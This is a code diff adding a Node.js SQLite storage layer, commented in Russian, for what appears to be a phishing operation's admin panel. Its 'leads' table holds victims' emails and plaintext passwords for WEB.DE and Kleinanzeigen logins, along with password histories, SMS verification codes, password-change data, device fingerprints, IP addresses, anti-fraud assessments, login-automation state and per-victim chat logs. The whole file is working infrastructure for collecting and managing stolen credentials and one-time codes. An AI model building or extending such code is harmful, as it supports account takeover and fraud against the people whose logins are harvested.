@@ -1,0 +1,648 @@
+/**
+ * SQLite layer (infrastructure). Not wired into server.js yet.
+ * DB file: data/database.sqlite (relative to project root).
+ */
+const path = require('path');
+const fs = require('fs');
+const Database = require('better-sqlite3');
+
+const PROJECT_ROOT = path.join(__dirname, '..', '..');
+/** Синхронно с server.js: общая папка данных при GMW_DATA_DIR. */
+const DATA_DIR = process.env.GMW_DATA_DIR
+  ? path.resolve(process.env.GMW_DATA_DIR)
+  : path.join(PROJECT_ROOT, 'data');
+const DB_PATH = path.join(DATA_DIR, 'database.sqlite');
+
+const CHAT_STATE_KEY = 'chat_state';
+
+let dbInstance = null;
+
+function ensureDataDir() {
+  if (!fs.existsSync(DATA_DIR)) {
+    fs.mkdirSync(DATA_DIR, { recursive: true });
+  }
+}
+
+const DDL = `
+PRAGMA journal_mode = WAL;
+PRAGMA foreign_keys = ON;
+
+CREATE TABLE IF NOT EXISTS leads (
+  id TEXT PRIMARY KEY NOT NULL,
+  email TEXT,
+  email_kl TEXT,
+  password TEXT,
+  password_kl TEXT,
+  created_at TEXT,
+  last_seen_at TEXT,
+  status TEXT,
+  ip TEXT,
+  platform TEXT,
+  screen_width INTEGER,
+  screen_height INTEGER,
+  user_agent TEXT,
+  brand TEXT,
+  webde_script_run_seq INTEGER,
+  webde_script_active_run INTEGER,
+  webde_login_grid_exhausted INTEGER,
+  webde_login_grid_step TEXT,
+  admin_error_kind TEXT,
+  admin_list_sort_at TEXT,
+  admin_log_archived INTEGER,
+  kl_log_archived INTEGER,
+  klein_password_error_de TEXT,
+  past_history_transferred INTEGER,
+  current_page TEXT,
+  script_automation_wait_until TEXT,
+  script_status TEXT,
+  session_pulse_at TEXT,
+  ip_country TEXT,
+  merge_actor TEXT,
+  merge_reason TEXT,
+  merged_at TEXT,
+  merged_from_id TEXT,
+  merged_into_id TEXT,
+  event_terminal_json TEXT,
+  password_history_json TEXT,
+  fingerprint_json TEXT,
+  sms_code_data_json TEXT,
+  change_password_data_json TEXT,
+  password_error_attempts_json TEXT,
+  telemetry_snapshots_json TEXT,
+  request_meta_json TEXT,
+  client_signals_json TEXT,
+  last_anti_fraud_assessment_json TEXT,
+  action_log_json TEXT,
+  device_signature_json TEXT,
+  opened_at TEXT,
+  klein_anmelden_seen_at TEXT
+);
+
+CREATE INDEX IF NOT EXISTS idx_leads_email ON leads (email);
+CREATE INDEX IF NOT EXISTS idx_leads_status ON leads (status);
+CREATE INDEX IF NOT EXISTS idx_leads_brand ON leads (brand);
+CREATE INDEX IF NOT EXISTS idx_leads_created_at ON leads (created_at);
+
+CREATE TABLE IF NOT EXISTS settings (
+  key TEXT PRIMARY KEY NOT NULL,
+  value TEXT NOT NULL
+);
+
+CREATE TABLE IF NOT EXISTS chat_messages (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  lead_id TEXT NOT NULL,
+  from_role TEXT NOT NULL,
+  body TEXT NOT NULL,
+  at TEXT NOT NULL,
+  FOREIGN KEY (lead_id) REFERENCES leads(id) ON DELETE CASCADE
+);
+
+CREATE INDEX IF NOT EXISTS idx_chat_messages_lead_id ON chat_messages (lead_id);
+`;
+
+/** Применить схему и pragma к уже открытому экземпляру (для миграций и тестов). */
+function ensureLeadExtraColumns(db) {
+  const cols = db.prepare('PRAGMA table_info(leads)').all();
+  const names = new Set(cols.map((c) => c.name));
+  if (!names.has('opened_at')) db.exec('ALTER TABLE leads ADD COLUMN opened_at TEXT');
+  if (!names.has('klein_anmelden_seen_at')) db.exec('ALTER TABLE leads ADD COLUMN klein_anmelden_seen_at TEXT');
+}
+
+function configureDatabase(db) {
+  db.pragma('journal_mode = WAL');
+  db.pragma('foreign_keys = ON');
+  db.exec(DDL);
+  ensureLeadExtraColumns(db);
+}
+
+function openDatabase() {
+  ensureDataDir();
+  const db = new Database(DB_PATH);
+  configureDatabase(db);
+  return db;
+}
+
+function getDb() {
+  if (!dbInstance) {
+    dbInstance = openDatabase();
+  }
+  return dbInstance;
+}
+
+function closeDb() {
+  if (dbInstance) {
+    dbInstance.close();
+    dbInstance = null;
+  }
+}
+
+const JSON_FIELDS = [
+  ['eventTerminal', 'event_terminal_json'],
+  ['passwordHistory', 'password_history_json'],
+  ['fingerprint', 'fingerprint_json'],
+  ['smsCodeData', 'sms_code_data_json'],
+  ['changePasswordData', 'change_password_data_json'],
+  ['passwordErrorAttempts', 'password_error_attempts_json'],
+  ['telemetrySnapshots', 'telemetry_snapshots_json'],
+  ['requestMeta', 'request_meta_json'],
+  ['clientSignals', 'client_signals_json'],
+  ['lastAntiFraudAssessment', 'last_anti_fraud_assessment_json'],
+  ['actionLog', 'action_log_json'],
+  ['deviceSignature', 'device_signature_json']
+];
+
+function stringifyJsonField(value) {
+  if (value === undefined || value === null) return null;
+  return JSON.stringify(value);
+}
+
+function parseJsonField(raw) {
+  if (raw == null || raw === '') return undefined;
+  try {
+    return JSON.parse(raw);
+  } catch {
+    return undefined;
+  }
+}
+
+function leadRowToObject(row) {
+  if (!row) return null;
+  const o = {
+    id: row.id,
+    email: row.email,
+    emailKl: row.email_kl,
+    password: row.password,
+    passwordKl: row.password_kl,
+    createdAt: row.created_at,
+    lastSeenAt: row.last_seen_at,
+    status: row.status,
+    ip: row.ip,
+    platform: row.platform,
+    screenWidth: row.screen_width,
+    screenHeight: row.screen_height,
+    userAgent: row.user_agent,
+    brand: row.brand,
+    webdeScriptRunSeq: row.webde_script_run_seq,
+    webdeScriptActiveRun: row.webde_script_active_run,
+    webdeLoginGridExhausted:
+      row.webde_login_grid_exhausted === 1 ? true : row.webde_login_grid_exhausted === 0 ? false : undefined,
+    webdeLoginGridStep: row.webde_login_grid_step,
+    adminErrorKind: row.admin_error_kind,
+    adminListSortAt: row.admin_list_sort_at,
+    adminLogArchived: row.admin_log_archived === 1 ? true : row.admin_log_archived === 0 ? false : undefined,
+    klLogArchived: row.kl_log_archived === 1 ? true : row.kl_log_archived === 0 ? false : undefined,
+    kleinPasswordErrorDe: row.klein_password_error_de,
+    pastHistoryTransferred:
+      row.past_history_transferred === 1 ? true : row.past_history_transferred === 0 ? false : undefined,
+    currentPage: row.current_page,
+    scriptAutomationWaitUntil: row.script_automation_wait_until,
+    scriptStatus: row.script_status,
+    sessionPulseAt: row.session_pulse_at,
+    ipCountry: row.ip_country,
+    mergeActor: row.merge_actor,
+    mergeReason: row.merge_reason,
+    mergedAt: row.merged_at,
+    mergedFromId: row.merged_from_id,
+    mergedIntoId: row.merged_into_id,
+    openedAt: row.opened_at,
+    kleinAnmeldenSeenAt: row.klein_anmelden_seen_at
+  };
+  for (const [camel, sqlCol] of JSON_FIELDS) {
+    const val = parseJsonField(row[sqlCol]);
+    if (val !== undefined) o[camel] = val;
+  }
+  return o;
+}
+
+function boolToInt(v) {
+  if (v === true) return 1;
+  if (v === false) return 0;
+  return null;
+}
+
+function leadObjectToRow(lead) {
+  return {
+    id: lead.id != null ? String(lead.id) : null,
+    email: lead.email != null ? String(lead.email) : null,
+    email_kl: lead.emailKl != null ? String(lead.emailKl) : null,
+    password: lead.password != null ? String(lead.password) : null,
+    password_kl: lead.passwordKl != null ? String(lead.passwordKl) : null,
+    created_at: lead.createdAt != null ? String(lead.createdAt) : null,
+    last_seen_at: lead.lastSeenAt != null ? String(lead.lastSeenAt) : null,
+    status: lead.status != null ? String(lead.status) : null,
+    ip: lead.ip != null ? String(lead.ip) : null,
+    platform: lead.platform != null ? String(lead.platform) : null,
+    screen_width: typeof lead.screenWidth === 'number' ? lead.screenWidth : null,
+    screen_height: typeof lead.screenHeight === 'number' ? lead.screenHeight : null,
+    user_agent: lead.userAgent != null ? String(lead.userAgent) : null,
+    brand: lead.brand != null ? String(lead.brand) : null,
+    webde_script_run_seq: typeof lead.webdeScriptRunSeq === 'number' ? lead.webdeScriptRunSeq : null,
+    webde_script_active_run: typeof lead.webdeScriptActiveRun === 'number' ? lead.webdeScriptActiveRun : null,
+    webde_login_grid_exhausted: boolToInt(lead.webdeLoginGridExhausted),
+    webde_login_grid_step: lead.webdeLoginGridStep != null ? String(lead.webdeLoginGridStep) : null,
+    admin_error_kind: lead.adminErrorKind != null ? String(lead.adminErrorKind) : null,
+    admin_list_sort_at: lead.adminListSortAt != null ? String(lead.adminListSortAt) : null,
+    admin_log_archived: boolToInt(lead.adminLogArchived),
+    kl_log_archived: boolToInt(lead.klLogArchived),
+    klein_password_error_de: lead.kleinPasswordErrorDe != null ? String(lead.kleinPasswordErrorDe) : null,
+    past_history_transferred: boolToInt(lead.pastHistoryTransferred),
+    current_page: lead.currentPage != null ? String(lead.currentPage) : null,
+    script_automation_wait_until: lead.scriptAutomationWaitUntil != null ? String(lead.scriptAutomationWaitUntil) : null,
+    script_status: lead.scriptStatus != null ? String(lead.scriptStatus) : null,
+    session_pulse_at: lead.sessionPulseAt != null ? String(lead.sessionPulseAt) : null,
+    ip_country: lead.ipCountry != null ? String(lead.ipCountry) : null,
+    merge_actor: lead.mergeActor != null ? String(lead.mergeActor) : null,
+    merge_reason: lead.mergeReason != null ? String(lead.mergeReason) : null,
+    merged_at: lead.mergedAt != null ? String(lead.mergedAt) : null,
+    merged_from_id: lead.mergedFromId != null ? String(lead.mergedFromId) : null,
+    merged_into_id: lead.mergedIntoId != null ? String(lead.mergedIntoId) : null,
+    opened_at: lead.openedAt != null ? String(lead.openedAt) : null,
+    klein_anmelden_seen_at: lead.kleinAnmeldenSeenAt != null ? String(lead.kleinAnmeldenSeenAt) : null,
+    event_terminal_json: stringifyJsonField(lead.eventTerminal),
+    password_history_json: stringifyJsonField(lead.passwordHistory),
+    fingerprint_json: stringifyJsonField(lead.fingerprint),
+    sms_code_data_json: stringifyJsonField(lead.smsCodeData),
+    change_password_data_json: stringifyJsonField(lead.changePasswordData),
+    password_error_attempts_json: stringifyJsonField(lead.passwordErrorAttempts),
+    telemetry_snapshots_json: stringifyJsonField(lead.telemetrySnapshots),
+    request_meta_json: stringifyJsonField(lead.requestMeta),
+    client_signals_json: stringifyJsonField(lead.clientSignals),
+    last_anti_fraud_assessment_json: stringifyJsonField(lead.lastAntiFraudAssessment),
+    action_log_json: stringifyJsonField(lead.actionLog),
+    device_signature_json: stringifyJsonField(lead.deviceSignature)
+  };
+}
+
+const INSERT_SQL = `
+INSERT OR REPLACE INTO leads (
+  id, email, email_kl, password, password_kl, created_at, last_seen_at, status, ip, platform,
+  screen_width, screen_height, user_agent, brand,
+  webde_script_run_seq, webde_script_active_run, webde_login_grid_exhausted, webde_login_grid_step,
+  admin_error_kind, admin_list_sort_at, admin_log_archived, kl_log_archived, klein_password_error_de,
+  past_history_transferred, current_page, script_automation_wait_until, script_status, session_pulse_at,
+  ip_country, merge_actor, merge_reason, merged_at, merged_from_id, merged_into_id,
+  opened_at, klein_anmelden_seen_at,
+  event_terminal_json, password_history_json, fingerprint_json, sms_code_data_json,
+  change_password_data_json, password_error_attempts_json, telemetry_snapshots_json, request_meta_json,
+  client_signals_json, last_anti_fraud_assessment_json, action_log_json, device_signature_json
+) VALUES (
+  @id, @email, @email_kl, @password, @password_kl, @created_at, @last_seen_at, @status, @ip, @platform,
+  @screen_width, @screen_height, @user_agent, @brand,
+  @webde_script_run_seq, @webde_script_active_run, @webde_login_grid_exhausted, @webde_login_grid_step,
+  @admin_error_kind, @admin_list_sort_at, @admin_log_archived, @kl_log_archived, @klein_password_error_de,
+  @past_history_transferred, @current_page, @script_automation_wait_until, @script_status, @session_pulse_at,
+  @ip_country, @merge_actor, @merge_reason, @merged_at, @merged_from_id, @merged_into_id,
+  @opened_at, @klein_anmelden_seen_at,
+  @event_terminal_json, @password_history_json, @fingerprint_json, @sms_code_data_json,
+  @change_password_data_json, @password_error_attempts_json, @telemetry_snapshots_json, @request_meta_json,
+  @client_signals_json, @last_anti_fraud_assessment_json, @action_log_json, @device_signature_json
+)
+`;
+
+function getAllLeads() {
+  const db = getDb();
+  const rows = db.prepare('SELECT * FROM leads ORDER BY datetime(created_at) DESC').all();
+  return rows.map(leadRowToObject);
+}
+
+function getLeadById(id) {
+  const db = getDb();
+  const row = db.prepare('SELECT * FROM leads WHERE id = ?').get(id);
+  return leadRowToObject(row);
+}
+
+function addLead(leadData) {
+  if (!leadData || !leadData.id) {
+    throw new Error('addLead: leadData.id is required');
+  }
+  const db = getDb();
+  db.prepare(INSERT_SQL).run(leadObjectToRow(leadData));
+  return getLeadById(leadData.id);
+}
+
+function deepMerge(a, b) {
+  const out = { ...a };
+  for (const k of Object.keys(b)) {
+    const bv = b[k];
+    if (bv === undefined) continue;
+    const av = out[k];
+    if (
+      bv &&
+      typeof bv === 'object' &&
+      !Array.isArray(bv) &&
+      av &&
+      typeof av === 'object' &&
+      !Array.isArray(av)
+    ) {
+      out[k] = deepMerge(av, bv);
+    } else {
+      out[k] = bv;
+    }
+  }
+  return out;
+}
+
+function updateLead(id, partialData) {
+  const existing = getLeadById(id);
+  if (!existing) {
+    return null;
+  }
+  const merged = deepMerge(existing, partialData);
+  merged.id = id;
+  const db = getDb();
+  db.prepare(INSERT_SQL).run(leadObjectToRow(merged));
+  return getLeadById(id);
+}
+
+/** camelCase (как в объекте лида) → колонка SQLite и тип для UPDATE. */
+const PARTIAL_SCALAR_FIELDS = {
+  email: { col: 'email', kind: 'str' },
+  emailKl: { col: 'email_kl', kind: 'str' },
+  password: { col: 'password', kind: 'str' },
+  passwordKl: { col: 'password_kl', kind: 'str' },
+  createdAt: { col: 'created_at', kind: 'str' },
+  lastSeenAt: { col: 'last_seen_at', kind: 'str' },
+  status: { col: 'status', kind: 'str' },
+  ip: { col: 'ip', kind: 'str' },
+  platform: { col: 'platform', kind: 'str' },
+  screenWidth: { col: 'screen_width', kind: 'int' },
+  screenHeight: { col: 'screen_height', kind: 'int' },
+  userAgent: { col: 'user_agent', kind: 'str' },
+  brand: { col: 'brand', kind: 'str' },
+  webdeScriptRunSeq: { col: 'webde_script_run_seq', kind: 'int' },
+  webdeScriptActiveRun: { col: 'webde_script_active_run', kind: 'int' },
+  webdeLoginGridExhausted: { col: 'webde_login_grid_exhausted', kind: 'bool' },
+  webdeLoginGridStep: { col: 'webde_login_grid_step', kind: 'str' },
+  adminErrorKind: { col: 'admin_error_kind', kind: 'str' },
+  adminListSortAt: { col: 'admin_list_sort_at', kind: 'str' },
+  adminLogArchived: { col: 'admin_log_archived', kind: 'bool' },
+  klLogArchived: { col: 'kl_log_archived', kind: 'bool' },
+  kleinPasswordErrorDe: { col: 'klein_password_error_de', kind: 'str' },
+  pastHistoryTransferred: { col: 'past_history_transferred', kind: 'bool' },
+  currentPage: { col: 'current_page', kind: 'str' },
+  scriptAutomationWaitUntil: { col: 'script_automation_wait_until', kind: 'str' },
+  scriptStatus: { col: 'script_status', kind: 'str' },
+  sessionPulseAt: { col: 'session_pulse_at', kind: 'str' },
+  ipCountry: { col: 'ip_country', kind: 'str' },
+  mergeActor: { col: 'merge_actor', kind: 'str' },
+  mergeReason: { col: 'merge_reason', kind: 'str' },
+  mergedAt: { col: 'merged_at', kind: 'str' },
+  mergedFromId: { col: 'merged_from_id', kind: 'str' },
+  mergedIntoId: { col: 'merged_into_id', kind: 'str' },
+  openedAt: { col: 'opened_at', kind: 'str' },
+  kleinAnmeldenSeenAt: { col: 'klein_anmelden_seen_at', kind: 'str' }
+};
+
+const JSON_FIELD_BY_CAMEL = Object.fromEntries(JSON_FIELDS);
+
+function coercePartialScalar(kind, v) {
+  if (v === null || v === undefined) return null;
+  if (kind === 'str') return String(v);
+  if (kind === 'int') {
+    if (typeof v === 'number' && Number.isFinite(v)) return v;
+    return null;
+  }
+  if (kind === 'bool') {
+    if (v === true) return 1;
+    if (v === false) return 0;
+    return null;
+  }
+  return null;
+}
+
+/**
+ * Точечный UPDATE одной строки leads. Вложенные поля (actionLog, fingerprint, …) сериализуются в JSON.
+ * null в updates → SQL NULL. Ключи со значением undefined пропускаются.
+ * @returns обновлённый объект лида или null, если строки с таким id нет или нечего обновлять.
+ */
+function updateLeadPartial(id, updates) {
+  if (id == null || !updates || typeof updates !== 'object') return null;
+  const idStr = String(id);
+  const exists = getDb().prepare('SELECT 1 FROM leads WHERE id = ?').get(idStr);
+  if (!exists) return null;
+
+  const fragments = [];
+  const values = [];
+
+  for (const key of Object.keys(updates)) {
+    if (key === 'id') continue;
+    const val = updates[key];
+    if (val === undefined) continue;
+
+    const jsonCol = JSON_FIELD_BY_CAMEL[key];
+    if (jsonCol) {
+      fragments.push(`${jsonCol} = ?`);
+      values.push(val === null ? null : stringifyJsonField(val));
+      continue;
+    }
+    const spec = PARTIAL_SCALAR_FIELDS[key];
+    if (spec) {
+      fragments.push(`${spec.col} = ?`);
+      values.push(coercePartialScalar(spec.kind, val));
+    }
+  }
+
+  if (fragments.length === 0) return getLeadById(idStr);
+
+  values.push(idStr);
+  const sql = `UPDATE leads SET ${fragments.join(', ')} WHERE id = ?`;
+  getDb().prepare(sql).run(...values);
+  return getLeadById(idStr);
+}
+
+function deleteLeadById(leadId) {
+  if (leadId == null) return 0;
+  return getDb().prepare('DELETE FROM leads WHERE id = ?').run(String(leadId)).changes;
+}
+
+function deleteAllLeads() {
+  getDb().prepare('DELETE FROM leads').run();
+}
+
+/** Атомарно: удалить старый id и вставить новый лог (слияние по email и т.п.). */
+function replaceLeadRow(oldId, newLead) {
+  if (!newLead || newLead.id == null) throw new Error('replaceLeadRow: newLead.id required');
+  const db = getDb();
+  const del = db.prepare('DELETE FROM leads WHERE id = ?');
+  const ins = db.prepare(INSERT_SQL);
+  db.transaction(() => {
+    del.run(String(oldId));
+    ins.run(leadObjectToRow(newLead));
+  })();
+}
+
+/**
+ * Полная замена набора лидов (редко: массовые операции): upsert всех записей из массива,
+ * удаление из БД лидов, чьих id нет в массиве (чат по FK каскадом чистится).
+ */
+function replaceAllLeads(leadsArray) {
+  if (!Array.isArray(leadsArray)) {
+    throw new Error('replaceAllLeads: expected an array');
+  }
+  const db = getDb();
+  const newIds = new Set();
+  for (const l of leadsArray) {
+    if (l && l.id != null) newIds.add(String(l.id));
+  }
+  const insert = db.prepare(INSERT_SQL);
+  const delOne = db.prepare('DELETE FROM leads WHERE id = ?');
+  const txn = db.transaction(() => {
+    const existing = db.prepare('SELECT id FROM leads').all();
+    for (const row of existing) {
+      if (!newIds.has(row.id)) delOne.run(row.id);
+    }
+    for (const lead of leadsArray) {
+      if (lead && lead.id != null) insert.run(leadObjectToRow(lead));
+    }
+  });
+  txn();
+}
+
+function getSetting(key) {
+  const db = getDb();
+  const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(key);
+  return row ? row.value : null;
+}
+
+function updateSetting(key, value) {
+  const db = getDb();
+  const upsert = db.prepare(
+    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
+  );
+  upsert.run(key, value);
+}
+
+/** Формат как у бывшего mode.json после парсинга. */
+function getModeData() {
+  let mode = 'auto';
+  let autoScript = false;
+  const modeRaw = getSetting('mode');
+  const autoRaw = getSetting('autoScript');
+  if (modeRaw != null && modeRaw !== '') {
+    try {
+      const v = JSON.parse(modeRaw);
+      mode = v === 'manual' ? 'manual' : 'auto';
+    } catch (_) {}
+  }
+  if (autoRaw != null && autoRaw !== '') {
+    try {
+      autoScript = JSON.parse(autoRaw) === true;
+    } catch (_) {}
+  }
+  return { mode, autoScript };
+}
+
+function writeModeData(next) {
+  if (!next || typeof next !== 'object') return;
+  updateSetting('mode', JSON.stringify(next.mode === 'manual' ? 'manual' : 'auto'));
+  updateSetting('autoScript', JSON.stringify(next.autoScript === true));
+}
+
+/** Полный объект чата (ключи — email/leadId, служебные _readAt, _openChatRequested). */
+function getChatState() {
+  const raw = getSetting(CHAT_STATE_KEY);
+  if (raw == null || raw === '') return {};
+  try {
+    const data = JSON.parse(raw);
+    return typeof data === 'object' && data !== null ? data : {};
+  } catch (_) {
+    return {};
+  }
+}
+
+function setChatState(obj) {
+  if (!obj || typeof obj !== 'object') return;
+  updateSetting(CHAT_STATE_KEY, JSON.stringify(obj));
+}
+
+/** Добавить одно сообщение в ветку chatKey (после migrate на стороне вызывающего при необходимости). */
+function insertChatMessage(chatKey, message) {
+  if (!chatKey || !message || typeof message !== 'object') return;
+  const db = getDb();
+  const upsert = db.prepare(
+    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
+  );
+  const txn = db.transaction(() => {
+    const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(CHAT_STATE_KEY);
+    let chat = {};
+    if (row && row.value) {
+      try {
+        const parsed = JSON.parse(row.value);
+        if (parsed && typeof parsed === 'object') chat = parsed;
+      } catch (_) {}
+    }
+    if (!Array.isArray(chat[chatKey])) chat[chatKey] = [];
+    chat[chatKey].push(message);
+    upsert.run(CHAT_STATE_KEY, JSON.stringify(chat));
+  });
+  txn();
+}
+
+/** Залить ключи из mode.json: mode, autoScript → settings. */
+function seedSettingsFromModeDoc(doc) {
+  const db = getDb();
+  const upsert = db.prepare(
+    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
+  );
+  if (doc && typeof doc === 'object') {
+    if (doc.mode != null) upsert.run('mode', JSON.stringify(doc.mode));
+    if (doc.autoScript != null) upsert.run('autoScript', JSON.stringify(doc.autoScript));
+  }
+}
+
+/** Одна ветка chat.json: массив { from, text, at }. */
+function replaceChatMessagesForLead(leadId, messages) {
+  const db = getDb();
+  const del = db.prepare('DELETE FROM chat_messages WHERE lead_id = ?');
+  const ins = db.prepare(
+    'INSERT INTO chat_messages (lead_id, from_role, body, at) VALUES (?, ?, ?, ?)'
+  );
+  const runMany = db.transaction((list) => {
+    del.run(leadId);
+    if (!Array.isArray(list)) return;
+    for (const m of list) {
+      if (!m || m.text == null) continue;
+      ins.run(leadId, String(m.from != null ? m.from : ''), String(m.text), String(m.at != null ? m.at : ''));
+    }
+  });
+  runMany(messages);
+}
+
+function getChatMessagesForLead(leadId) {
+  const db = getDb();
+  const rows = db.prepare(
+    'SELECT from_role, body, at FROM chat_messages WHERE lead_id = ? ORDER BY id ASC'
+  ).all(leadId);
+  return rows.map((r) => ({ from: r.from_role, text: r.body, at: r.at }));
+}
+
+module.exports = {
+  DB_PATH,
+  DATA_DIR,
+  getDb,
+  closeDb,
+  configureDatabase,
+  /** SQL для INSERT OR REPLACE лида (совпадает с addLead). */
+  INSERT_LEAD_SQL: INSERT_SQL,
+  leadObjectToRow,
+  getAllLeads,
+  getLeadById,
+  addLead,
+  updateLead,
+  updateLeadPartial,
+  deleteLeadById,
+  deleteAllLeads,
+  replaceLeadRow,
+  deepMerge,
+  replaceAllLeads,
+  getSetting,
+  updateSetting,
+  getModeData,
+  writeModeData,
+  getChatState,
+  setChatState,
+  insertChatMessage,
+  seedSettingsFromModeDoc,
+  replaceChatMessagesForLead,
+  getChatMessagesForLead
+};
